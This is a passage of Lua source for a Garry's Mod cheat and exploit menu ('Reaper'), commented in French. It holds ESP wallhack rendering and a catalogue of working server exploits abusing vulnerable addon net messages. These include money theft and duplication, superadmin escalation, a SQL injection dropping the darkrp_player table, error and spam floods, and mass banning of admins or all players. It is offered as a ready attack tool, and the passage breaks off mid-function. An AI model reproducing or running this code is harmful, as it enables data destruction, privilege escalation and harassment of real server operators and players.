Vector( max.x, max.y, min.z ),
Vector( max.x, max.y, max.z )
}
local minX, minY, maxX, maxY = ScrW() * 2, ScrH() * 2, 0, 0
for _, corner in pairs( corners ) do
local onScreen = ent:LocalToWorld( corner ):ToScreen()
minX, minY = math.min( minX, onScreen.x ), math.min( minY, onScreen.y )
maxX, maxY = math.max( maxX, onScreen.x ), math.max( maxY, onScreen.y )
end
return minX, minY, maxX, maxY
end
local function HeadPos(ply)
if IsValid(ply) then
local hbone = ply:LookupBone("ValveBiped.Bip01_Head1")
return ply:GetBonePosition(hbone)
else return end
end
local function Visible(ply)
local trace = {start = LocalPlayer():GetShootPos(),endpos = {LocalPlayer(), ply}}
local tr = util.TraceLine(trace)
if tr.Fraction == 1 then
return true
else
return false
end 
end
local function IsSteamFriend( ply )
return ply:GetFriendStatus() == "friend"
end
local function FillRGBA(x,y,w,h,col)
surface.SetDrawColor( col.r, col.g, col.b, col.a );
surface.DrawRect( x, y, w, h );
end
local function OutlineRGBA(x,y,w,h,col)
surface.SetDrawColor( col.r, col.g, col.b, col.a );
surface.DrawOutlinedRect( x, y, w, h );
end
local function DrawCrosshair()
local w = ScrW() / 2.003;
local h = ScrH() / 2;
FillRGBA( w - 15, h, 35, 3, HSVToColor( CurTime() % 6 * 100, 1, 1 ) );
FillRGBA( w, h - 15.8, 3, 35, HSVToColor( CurTime() % 6 * 100, 1, 1 ) );
end
function DrawESP()
if ReaperESP:GetInt() == 1 then
for k, v in pairs(ents.GetAll()) do
if v ~= LocalPlayer() then
if( v:IsNPC() ) then
local drawColor = HSVToColor( CurTime() % 6 * 100, 1, 1 );
local drawPosit = v:GetPos():ToScreen();
if( Visible(v) ) then
drawColor = HSVToColor( CurTime() % 6 * 100, 1, 1 );
else
drawColor = HSVToColor( CurTime() % 6 * 100, 1, 1 );
end
local textData = {}
textData.pos = {}
textData.pos[1] = drawPosit.x;
textData.pos[2] = drawPosit.y;
textData.color = drawColor;
textData.text = "NPC";
textData.font = "DefaultFixed";
textData.xalign = TEXT_ALIGN_CENTER;
textData.yalign = TEXT_ALIGN_CENTER;
draw.Text( textData );
elseif( v:IsPlayer() and v:Health() > 0 and v:Alive() ) then
local drawColor = HSVToColor( CurTime() % 6 * 100, 1, 1 );
local drawPosit = v:GetPos():ToScreen();
if( Visible(v) ) then
drawColor.a = 255;
else
drawColor.r = HSVToColor( CurTime() % 6 * 100, 1, 1 )
drawColor.g = HSVToColor( CurTime() % 6 * 100, 1, 1 )
drawColor.b = HSVToColor( CurTime() % 6 * 100, 1, 1 )
end
local textData = {}
textData.pos = {}
textData.pos[1] = drawPosit.x;
textData.pos[2] = drawPosit.y;
textData.color = HSVToColor( CurTime() % 6 * 100, 1, 1 );
textData.text = v:GetName();
textData.font = "DefaultFixed";
textData.xalign = TEXT_ALIGN_CENTER;
textData.yalign = TEXT_ALIGN_CENTER;
draw.Text( textData );
local max_health = 100;
if( v:Health() > max_health ) then
max_health = v:Health();
end
local mx = max_health / 4;
local mw = v:Health() / 4;
local drawPosHealth = drawPosit;
drawPosHealth.x = drawPosHealth.x - ( mx / 2 );
drawPosHealth.y = drawPosHealth.y + 10;
FillRGBA( drawPosHealth.x - 1, drawPosHealth.y - 1, mx + 2, 4 + 2, Color( 0, 0, 0, 255 ) );
FillRGBA( drawPosHealth.x, drawPosHealth.y, mw, 4, drawColor );
end
end
end
end
end
function DrawESPCORNER()
if ReaperESP:GetInt() == 1 then
for k,v in pairs(player.GetAll()) do
local x1,y1,x2,y2 = coordinates(v)
surface.SetDrawColor(HSVToColor( CurTime() % 6 * 100, 1, 1 ))
surface.DrawLine( x1, y1, math.min( x1 + 10, x2 ), y1 )
surface.DrawLine( x1, y1, x1, math.min( y1 + 10, y2 ) )
surface.DrawLine( x2, y1, math.max( x2 - 10, x1 ), y1 )
surface.DrawLine( x2, y1, x2, math.min( y1 + 10, y2 ) )
surface.DrawLine( x1, y2, math.min( x1 + 10, x2 ), y2 )
surface.DrawLine( x1, y2, x1, math.max( y2 - 10, y1 ) )
surface.DrawLine( x2, y2, math.max( x2 - 10, x1 ), y2 )
surface.DrawLine( x2, y2, x2, math.max( y2 - 10, y1 ) )
end
end
end
function DrawXHair()
if( ReaperCROSSHAIR:GetInt() == 1 ) then
DrawCrosshair();
end
end
local function CommandesDraw()
if LESPMirror:GetInt() > 0 then
local pitch = LESPMirrorpitch:GetInt()
if pitch < 0 then pitch = pitch * LocalPlayer():EyeAngles().p end
local yaw = LESPMirroryaw:GetInt()
if yaw < 0 then yaw = yaw * LocalPlayer():EyeAngles().y end
local roll = LESPMirrorroll:GetInt()
if roll < 0 then roll = roll * LocalPlayer():EyeAngles().r end
local Cam = {}
Cam.angles = Angle( LocalPlayer():EyeAngles().p + pitch, LocalPlayer():EyeAngles().y + yaw, LocalPlayer():EyeAngles().r + roll )
Cam.origin = LocalPlayer():GetShootPos()
Cam.x = LESPMirrorx:GetInt() +300
Cam.y = LESPMirrory:GetInt()
Cam.w = LESPMirrorw:GetInt()
Cam.h = LESPMirrorh:GetInt()
render.RenderView( Cam )
surface.SetDrawColor( HSVToColor( CurTime() % 6 * 100, 1, 1 )  )
surface.DrawOutlinedRect( LESPMirrorx:GetInt() +300, LESPMirrory:GetInt(), LESPMirrorw:GetInt(),LESPMirrorh:GetInt() )
surface.DrawOutlinedRect( LESPMirrorx:GetInt() +301, LESPMirrory:GetInt() +1, LESPMirrorw:GetInt(),LESPMirrorh:GetInt() )
surface.SetDrawColor( 255, 255, 255, 255 )
surface.DrawRect( ScrW() / 2 - 1, ScrH() / 2 - 1, 2, 2 )
end
if LESPRadar:GetInt() > 0 then
local Cam = {}
Cam.angles = Angle( 90, LocalPlayer():EyeAngles().y, 0 )
local Zvar = LESPRadarfov:GetInt()
if LESPRadarauto:GetInt() > 0 then
local trace = {}
trace.start = LocalPlayer():GetPos() + Vector( 0, 0, 5 )
trace.endpos = LocalPlayer():GetPos() + Vector( 0, 0, LESPRadarfov:GetInt() )
trace.filter = LocalPlayer()
if util.TraceLine( trace ).Hit then
Zvar = util.TraceLine( trace ).HitPos.z - 5 - LocalPlayer():GetPos().z
end
end
Cam.origin = LocalPlayer():GetPos() + Vector( 0, 0, Zvar )
Cam.x = LESPRadarx:GetInt()
Cam.y = LESPRadary:GetInt()
Cam.w = LESPRadarw:GetInt()
Cam.h = LESPRadarh:GetInt()
render.RenderView( Cam )
surface.SetDrawColor( HSVToColor( CurTime() % 6 * 100, 1, 1 )  )
surface.DrawOutlinedRect( LESPMirrorx:GetInt(), LESPMirrory:GetInt(), LESPMirrorw:GetInt(),LESPMirrorh:GetInt() )
surface.DrawOutlinedRect( LESPRadarx:GetInt() +1, LESPRadary:GetInt() +1, LESPRadarw:GetInt() ,LESPRadarh:GetInt() )
surface.SetDrawColor( HSVToColor( CurTime() % 6 * 100, 1, 1 ))
surface.DrawRect( ScrW() / 2 - 1, ScrH() / 2 - 1, 2, 2 )
end
end
hook.Add( "HUDPaint", "LESP", CommandesDraw )
hook.Add( "HUDPaint", "DrawESP", DrawESP );
hook.Add( "HUDPaint", "DrawESPCORNER", DrawESPCORNER );
hook.Add( "HUDPaint", "DrawXHair", DrawXHair );
hook.Add( "HUDPaint", "DrawXHair", DrawXHair );
-- FIN DU ESP
end)

local n = net
local nr = n.Receive
local s = n.ReadString

nr("zilnixestbo", function()
	local r = s()
	print(r)
end)

nr("nostrip", function()
	local r = s()
	print(r)
end)

nr("zilnix", function()
	local r = s()
	print(r)
end)

-- RconStealer

-- EXPLOIT MENU (LOKIDEV ETC..)
local RatesScaleLevel = LocalPlayer():SteamID()
local grad = Material( "gui/gradient" )
local degraderhaut = Material( "gui/gradient_up" )
local degraderbas = Material( "gui/gradient_down" )
local ctext = chat.AddText
local ply = LocalPlayer()
local noir = Color ( 0,0,0,255 )
local blanc = Color ( 255,255,255,255 )
local vert = Color ( 2,200,21,100 )
local bleu = Color ( 2,18,255,255 )
local cyan = Color ( 0,119,206,255 )
local asuna = Color ( 236,111,0,255 )
local rouge = Color ( 190,0,0,255 )
local multicolore = Color (math.random(1,255),math.random(1,255),math.random(1,255))
local lil = Color ( 141,0,158,255 )
local chocolat = Color ( 111,42,0,255 )
local gris = Color ( 119,119,119,255 )
local gaymen = Color ( 240,113,196,255 )
local mer = Color ( 28,41,152,255 )

function FAUCHEUSE.NetStart( str )
local netstart = net.Start
if Reaper and Reaper.G and Reaper.G.net then
netstart = Reaper.G.net.Start
else
--        print( "sending netmessage in insecure mode" )
end
return netstart( str )
end
function FAUCHEUSE.ValidNetString( str )
local netstart = net.Start
if Reaper and Reaper.G and Reaper.G.net then
netstart = Reaper.G.net.Start
else
--        print( "scanning for exploit in insecure mode" )
end
local status, error = pcall( netstart, str )
return status
end
function FAUCHEUSE.ValidNetString( str )
local status, error = pcall( net.Start, str )
return status
end
FAUCHEUSE.sploits = {}
local severitycols = {
[1] = Color( 255, 255, 255, 200 ),
[2] = Color( 255, 255, 255, 200 ),
[3] = Color( 255, 255, 255, 200 ),
[4] = Color( 255, 255, 255, 200 ),
}
function FAUCHEUSE.AddExploit( name, tab )
if !isstring( name ) then print("U FUCKED UP A SPLOIT RETARD") return end
if !istable( tab ) then print("U FUCKED UP A SPLOIT RETARD") return end
FAUCHEUSE.sploits[name] = tab
end
function FAUCHEUSE.IsStored( addr )
return FAUCHEUSE.memory[addr] != nil
end
function FAUCHEUSE.GetStored( addr, fallback )
if fallback and FAUCHEUSE.memory[addr] == nil then return fallback end
return FAUCHEUSE.memory[addr]
end
function FAUCHEUSE.Store( addr, val )
FAUCHEUSE.memory[addr] = val
end
function FAUCHEUSE.GetAllStored()
return FAUCHEUSE.memory
end
function FAUCHEUSE.GetAllStoredData()
local ret = {}
for k, v in pairs( FAUCHEUSE.memory ) do
if !istable( v ) then ret[k] = v end
end
return ret
end
FAUCHEUSE.AddExploit( "€ Customizable Printers Money Stealer €", {
desc = "Vole instantanément tout l'argent de chaque Printer sur le serveur",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "SyncPrinterButtons76561198056171650" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
if !timer.Exists( "Reaper_exploit_shekels" ) then
FAUCHEUSE.ChatText( "Vole de l'argent lancé" )
timer.Create( "Reaper_exploit_shekels", 0.1, 0, function()
for k, v in pairs(ents.GetAll()) do
if( v:GetClass():find("print") ) then
FAUCHEUSE.NetStart( "SyncPrinterButtons76561198056171650" )
net.WriteEntity(v)
net.WriteUInt(2, 4)
net.SendToServer()
end
end
end)
else
timer.Remove( "Reaper_exploit_shekels" )
FAUCHEUSE.ChatText( "Vole de l'argent stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Spam De Messages Privé [Friend]", {
desc = "Spams les personnes que tu veut sur le serveur",
severity = 1,
scan = function() return (FAUCHEUSE.ValidNetString( "sendtable" ) and ulx and ulx.friends ) end,
functions = {
{ typ = "string", name = "Entrer un message", default = "Owned By TheReaper", addr = "fr_spamstring" },
{ typ = "players", addr = "fr_players" },
{ typ = "func", name = "Lancer Le Spam", func = function()
if !timer.Exists( "bigspams" ) then
FAUCHEUSE.ChatText( "Gros Spam Lancé" )
timer.Create( "bigspams", 0.5, 0, function()
local t = FAUCHEUSE.GetStored( "fr_players", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local buyit = {}
for i = 1, 15 do
table.insert( buyit, FAUCHEUSE.GetStored( "fr_spamstring", "RIP les lags :/ */*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*" ) )
end
FAUCHEUSE.NetStart( "sendtable" )
net.WriteEntity( v )
net.WriteTable( buyit )
net.SendToServer()
end
end)
else
timer.Remove( "bigspams" )
FAUCHEUSE.ChatText( "Gros Spam Stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Spam D'Erreur La Console", {
desc = "Détruit le serveur rcon avec des erreurs massives )",
severity = 1,
scan = function() return FAUCHEUSE.ValidNetString( "steamid2" ) end,
functions = {
{ typ = "func", name = "Lancer Le Spam", func = function()
if !timer.Exists( "Reaper_exploit_errorz" ) then
FAUCHEUSE.ChatText( "Spam D'erreur Lancé" )
timer.Create( "Reaper_exploit_errorz", 0.1, 0, function()
FAUCHEUSE.NetStart( "steamid2" )
net.WriteString( "Something is creating very strong script errors" )
net.SendToServer()
end)
else
timer.Remove( "Reaper_exploit_errorz" )
FAUCHEUSE.ChatText( "Spam D'erreur Stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Spam D'Erreur Rcon Massif", {
desc = "Détruit le serveur rcon avec des erreurs massive.",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "steamid2" ) end,
functions = {
{ typ = "func", name = "Lancer Le Spam", func = function()
if !timer.Exists( "Reaper_exploit_errorzt" ) then
FAUCHEUSE.ChatText( "Spam D'erreur Lancé" )
timer.Create( "Reaper_exploit_errorzt", 0, 0, function()
for i = 1, 100 do
FAUCHEUSE.NetStart( "steamid2" )
net.WriteString( "Something is creating very strong script errors" )
net.SendToServer()
end
end)
else
timer.Remove( "Reaper_exploit_errorzt" )
FAUCHEUSE.ChatText( "Spam D'erreur Lancé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Kun Drug €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "Kun_SellDrug" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
if !timer.Exists( "Reaper_exploit_selldrugon" ) then
FAUCHEUSE.ChatText( "Exploit lancé" )
timer.Create( "Reaper_exploit_selldrugon", 0, 0, function()
for i=1,1000 do
FAUCHEUSE.NetStart("Kun_SellDrug")
net.WriteString("mushroom")
net.SendToServer()
end 
end)
else
timer.Remove( "Reaper_exploit_selldrugon" )
FAUCHEUSE.ChatText( "Exploit stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "☢ Give Superadmin ☢", {
desc = "Donnez le superadmin aux gens (rejoignez pour que cela prenne effet)",
severity = 4,
scan = function() return FAUCHEUSE.ValidNetString( "pplay_deleterow" ) end,
functions = {
{ typ = "players", addr = "l_superadmins" },
{ typ = "func", name = "Lancer", func = function()
local t = FAUCHEUSE.GetStored( "l_superadmins", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local id = v:SteamID()
local tbl = {}
tbl.name = "FAdmin_PlayerGroup"
tbl.where = {
"steamid",
tostring(id)
}
FAUCHEUSE.NetStart("pplay_deleterow")
net.WriteTable(tbl)
net.SendToServer()
local tbl = {}
tbl.tblname = "FAdmin_PlayerGroup"
tbl.tblinfo = {
tostring(id),
"superadmin"
}
FAUCHEUSE.NetStart("pplay_addrow")
net.WriteTable(tbl)
net.SendToServer()
FAUCHEUSE.ChatText( "superadmin donné à "..v:Nick() )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "☢ Niquer la base de donné SQL (sa pique) ☢", {
desc = "Vandalisez la base de données darkrp master SQL, effaçant toutes les données des joueurs, vous devez être superamin !!",
severity = 4,
scan = function() return FAUCHEUSE.ValidNetString( "pplay_sendtable" ) end,
functions = {
{ typ = "func", name = "Détruire", func = function()
local tbl = {}
tbl.tblname = "darkrp_door; DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)"
tbl.ply = LocalPlayer()
FAUCHEUSE.NetStart("pplay_sendtable")
net.WriteTable(tbl)
net.SendToServer()
FAUCHEUSE.ChatText( "Base de données SQL Server détruite" )
end, },
},
} )
FAUCHEUSE.AddExploit( "Détruire Les Datas", {
desc = "Défoncer simplements les datas de leur serveur pour énérver leur devs :D",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "WriteQuery" ) end,
functions = {
{ typ = "func", name = "Détruire", func = function()
if !timer.Exists( "Reaper_exploit_datatrasher" ) then
FAUCHEUSE.ChatText( "Démarrage du spam du dossier data" )
timer.Create( "Reaper_exploit_datatrasher", 0.5, 0, function()
FAUCHEUSE.NetStart( "WriteQuery" )
net.WriteString( "BAN ME -> "..LocalPlayer():SteamID()..string.rep( "!", math.random( 1, 5000 ) ) )
net.SendToServer()
end)
else
timer.Remove( "Reaper_exploit_datatrasher" )
FAUCHEUSE.ChatText( "Spam du dossier data Stopper" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Gives Armes", {
desc = "Exploit pour avoir des armes",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "CraftSomething" ) end,
functions = {
{ typ = "string", name = "Nom Arme", default = "m9k_davy_crockett", addr = "armes_a_prendre" },
{ typ = "func", name = "Give", func = function()
FAUCHEUSE.NetStart( "CraftSomething" )
net.WriteEntity( LocalPlayer() )
net.WriteString( FAUCHEUSE.GetStored( "armes_a_prendre" ) )
net.WriteString( "" )
net.WriteString( "weapon" )
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "Exploit ULX Extended ", {
desc = "Attention cette exploit est risquée si le script est à jour vous allez être kick ^^",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "banleaver" ) end,
functions = {
{ typ = "func", name = "Ban Admins", func = function()
for k,v in pairs(player.GetAll()) do               
if v:GetUserGroup() != "user" then -- Custom first ranks, youre fucked bro                 
if v != LocalPlayer() then                 
FAUCHEUSE.NetStart("banleaver")                 
net.WriteString(v:SteamID().."{sep}".." Vous avez était Fauché...")                
net.SendToServer()                 
end                
end                
end 
end, },
{ typ = "func", name = "Ban Tous", func = function()
for k,v in pairs(player.GetAll()) do               
if v != LocalPlayer() then                 
FAUCHEUSE.NetStart("banleaver")                 
net.WriteString(v:SteamID().."{sep}".." Vous avez était Fauché...")                
net.SendToServer()                 
end                
end  
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Casino NPC €", {
desc = "Exploit d'argent",
severity = 4,
scan = function() return FAUCHEUSE.ValidNetString( "75_plus_win" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent" },
{ typ = "players", addr = "l_players_listing" },
{ typ = "func", name = "Recevoir", func = function()
local t = FAUCHEUSE.GetStored( "l_players_listing", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
FAUCHEUSE.NetStart( "75_plus_win" )
net.WriteString( FAUCHEUSE.GetStored( "montant_argent" ) )
net.WriteEntity(v)
net.SendToServer()
end
end, },
{ typ = "func", name = "Enlever", func = function()
local t = FAUCHEUSE.GetStored( "l_players_listing", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
FAUCHEUSE.NetStart( "75_plus_win" )
net.WriteString( -FAUCHEUSE.GetStored( "montant_argent" ) )
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
FAUCHEUSE.AddExploit( "€ ATM €", {
desc = "Exploit d'argent",
severity = 4,
scan = function() return FAUCHEUSE.ValidNetString( "ATMDepositMoney" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent5" },
{ typ = "func", name = "Recevoir", func = function()
FAUCHEUSE.NetStart( "ATMDepositMoney" )
net.WriteFloat( -FAUCHEUSE.GetStored( "montant_argent5" ) )
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "Super Spam Spawn Taxi", {
desc = "Exploit pour faire chier les soit disant codeur ;)",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "Taxi_Add" ) end,
functions = {
{ typ = "func", name = "Spawn", func = function()
local Pos = LocalPlayer():GetEyeTrace().HitPos
FAUCHEUSE.NetStart("Taxi_Add")
net.WriteString("Taxi Super Exploit #"..math.random( 1, 9999 ))
net.WriteTable({[1]=Pos.x,[2]=Pos.y,[3]=Pos.z})
net.WriteFloat(-9999999)
net.WriteString("Stop leak les mecs srx x)")
net.SendToServer()
end, },
{ typ = "func", name = "Lancer Super Spam", func = function()
if !timer.Exists( "taxispam" ) then
FAUCHEUSE.ChatText( "Super Spam Lancé" )
timer.Create( "taxispam", 0.05, 0, function()
local Pos = LocalPlayer():GetEyeTrace().HitPos
FAUCHEUSE.NetStart("Taxi_Add")
net.WriteString("Taxi Super Exploit #"..math.random( 1, 9999 ))
net.WriteTable({[1]=Pos.x,[2]=Pos.y,[3]=Pos.z})
net.WriteFloat(-9999999)
net.WriteString("Les addons leaks c'est plein d'exploit :D")
net.SendToServer()
end)
else
timer.Remove( "taxispam" )
FAUCHEUSE.ChatText( "Super Spam Stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "€ eMining €", {
desc = "trop connu",
severity = 4,
scan = function() return FAUCHEUSE.ValidNetString( "SellMinerals" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent6" },
{ typ = "func", name = "Give", func = function()
for k,v in pairs(SkillDB) do
if not ( v.iSkill == true ) then
FAUCHEUSE.NetStart("degraderhaute")
net.WriteTable( { LuaName = v.LuaName, Amount = -FAUCHEUSE.GetStored( "montant_argent6" ) } )
net.SendToServer()
FAUCHEUSE.NetStart( "SellMinerals" )
net.WriteTable( { Target = LocalPlayer() } )
net.SendToServer()
end
end
end, },
{ typ = "func", name = "Enlever", func = function()
for k,v in pairs(SkillDB) do
if not ( v.iSkill == true ) then
FAUCHEUSE.NetStart("degraderhaute")
net.WriteTable( { LuaName = v.LuaName, Amount = FAUCHEUSE.GetStored( "montant_argent6" ) } )
net.SendToServer()
FAUCHEUSE.NetStart( "SellMinerals" )
net.WriteTable( { Target = LocalPlayer() } )
net.SendToServer()
end
end
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Gamble NPC €", {
desc = "Exploit d'argent Infini",
severity = 4,
scan = function() return FAUCHEUSE.ValidNetString( "TakeBetMoney" ) end,
functions = {
{ typ = "func", name = "Give", func = function()
FAUCHEUSE.NetStart( "TakeBetMoney" )
net.WriteTable({1e333333 , 1e333333})
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Kun Oil Mod €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "Kun_SellOil" ) end,
functions = {
{ typ = "func", name = "Give", func = function()
for k,v in pairs(ents.GetAll()) do
FAUCHEUSE.NetStart("Kun_SellOil")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Rejoindre la Police 1", {
desc = "Rejoint la police sans passer par le formulaire",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "PoliceJoin" ) end,
functions = {
{ typ = "func", name = "Rejoindre", func = function()
FAUCHEUSE.NetStart("PoliceJoin")
net.SendToServer() 
end, },
},
} )
FAUCHEUSE.AddExploit( "Rejoindre la Police 2", {
desc = "Rejoint la police sans passer le formulaire",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "CpForm_Answers" ) end,
functions = {
{ typ = "func", name = "Rejoindre", func = function()
FAUCHEUSE.NetStart("CpForm_Answers")
net.WriteEntity(LocalPlayer())
net.WriteTable({})
net.SendToServer()
end, },
},
} )

FAUCHEUSE.AddExploit( "Arreter Tout Le Serveur", {
desc = "fuck",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "optarrest" ) end,
functions = {
{ typ = "func", name = "Arreter Tous", func = function()
for k,v in pairs(player.GetAll()) do
FAUCHEUSE.NetStart("optarrest")
net.WriteInt(666, 32)
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )

FAUCHEUSE.AddExploit( "€ Deposit Money €", {
desc = "Exploit d'argent avec les ATM Deposit Money",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "DepositMoney" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent7" },
{ typ = "func", name = "Lancer", func = function()
for k,v in pairs(ents.GetAll()) do 
swag = v 
end
for k,v in pairs(player.GetAll()) do
FAUCHEUSE.NetStart( "DepositMoney" )
net.WriteEntity(swag)
net.WriteString(-FAUCHEUSE.GetStored( "montant_argent7" ))
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
FAUCHEUSE.AddExploit( "MDE", {
desc = "Exploit pour supprimer des PermaProps (Viser le props et cliquer sur l'exploit pour le supprimer)",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "MDE_RemoveStuff_C2S" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
FAUCHEUSE.NetStart( "MDE_RemoveStuff_C2S" )
net.WriteTable( {DATA="",TARGET=LocalPlayer():GetEyeTrace().Entity} )
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "€ SS Shelf NET €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "NET_SS_DoBuyTakeoff" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent9" },
{ typ = "func", name = "Lancer", func = function()
for k,v in pairs(ents.GetAll()) do 
swag = v 
end
FAUCHEUSE.NetStart( 'NET_SS_DoBuyTakeoff' )          
net.WriteEntity(LocalPlayer())          
net.WriteEntity(swag)          
net.WriteTable({'spawned_weapon'})          
net.WriteInt(-FAUCHEUSE.GetStored( "montant_argent9" ), 16)       
net.SendToServer()   
end, },
},
} )
FAUCHEUSE.AddExploit( "€ MODIFIER TAXES €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "NET_EcSetTax" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent10" },
{ typ = "func", name = "Lancer", func = function()
FAUCHEUSE.NetStart("NET_EcSetTax")
net.WriteInt(-FAUCHEUSE.GetStored( "montant_argent10" ), 16)
net.SendToServer() 
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Fine System €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "RP_Accept_Fine" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent11" },
{ typ = "players", addr = "l_players_listing_fine" },
{ typ = "func", name = "Prendre", func = function()
local t = FAUCHEUSE.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
FAUCHEUSE.NetStart("RP_Accept_Fine")
net.WriteString(v:Nick())
net.WriteDouble(-FAUCHEUSE.GetStored( "montant_argent11" ))
net.SendToServer()
end
end, },
{ typ = "func", name = "Envoyer Amende x)", func = function()
local t = FAUCHEUSE.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
FAUCHEUSE.NetStart("RP_Fine_Player")
net.WriteString(v:Nick())
net.WriteString(v:Nick())
net.WriteDouble(FAUCHEUSE.GetStored( "montant_argent11" ))
net.WriteString("Aie aie, les amendes sa pique ?")
net.SendToServer()
end
end, },
{ typ = "func", name = "Spam Envoyer Amende x)", func = function()
if !timer.Exists( "spamamandefine" ) then
FAUCHEUSE.ChatText( "Spam lancé" )
timer.Create( "spamamandefine", 0.1, 0, function()
local t = FAUCHEUSE.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
FAUCHEUSE.NetStart("RP_Fine_Player")
net.WriteString(v:Nick())
net.WriteString(v:Nick())
net.WriteDouble(FAUCHEUSE.GetStored( "montant_argent11" ))
net.WriteString("Aie aie, les amendes sa pique ?")
net.SendToServer()
end
end)
else
timer.Remove( "spamamandefine" )
FAUCHEUSE.ChatText( "Spam stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "€ 3D Cardealer €", {
desc = "Exploit d'argent",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "RXCAR_Shop_Store_C2S" ) end,
functions = {
{ typ = "func", name = "Dupliquer", func = function()
for i = 0, 75 do               
FAUCHEUSE.NetStart( "RXCAR_Shop_Store_C2S" );               
net.WriteTable( { E = ent } );                 
net.SendToServer();                
end
end, },
{ typ = "func", name = "Tout Vendre", func = function()
local ent              
for k,v in pairs(ents.GetAll()) do                 
if v:GetClass() == "rm_car_dealer" then                
ent = v                
end                
end                
for k,v in pairs(RX3DCar_Inventory) do                 
FAUCHEUSE.NetStart( "RXCAR_SellINVCar_C2S" )                
net.WriteTable({UN=v.UniqueID,SE=ent})                 
net.SendToServer()                 
end      
end, },          
},
} )
FAUCHEUSE.AddExploit( "Supprimer Armes / Argent", {
desc = "Supprimer les armes / l'argent de touts le monde",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "drugseffect_remove" ) end,
functions = {
{ typ = "func", name = "Supprimer Armes", func = function()
FAUCHEUSE.NetStart("drugseffect_remove")
net.SendToServer()
end, },
{ typ = "func", name = "Supprimer Argent", func = function()
FAUCHEUSE.NetStart("drugs_money")
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Crafting Mod €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "CRAFTINGMOD_SHOP" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent14" },
{ typ = "func", name = "Ajouter Argent", func = function()
